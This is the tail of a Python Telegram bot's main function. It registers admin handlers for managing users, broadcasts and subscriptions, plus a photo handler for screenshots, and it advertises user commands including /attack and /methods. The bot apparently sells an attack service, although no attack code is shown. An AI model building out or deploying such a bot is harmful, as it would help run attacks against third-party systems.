    application.add_handler(CommandHandler("adduser", add_user_command))
    application.add_handler(CommandHandler("removeuser", remove_user_command))
    application.add_handler(CommandHandler("pending", pending_list))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("broadcast_user", broadcast_user_command))
    application.add_handler(CommandHandler("refresh", refresh_subs))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.PHOTO, handle_screenshot))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(callback_handler))
    
    print("✅ Bot is running successfully!")
    print("📋 Available Commands:")
    print("   User: /start, /help, /attack, /status, /stats, /about, /methods")
    print("   Admin: /adduser, /removeuser, /pending, /broadcast, /broadcast_user, /refresh")
    print("=" * 50)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()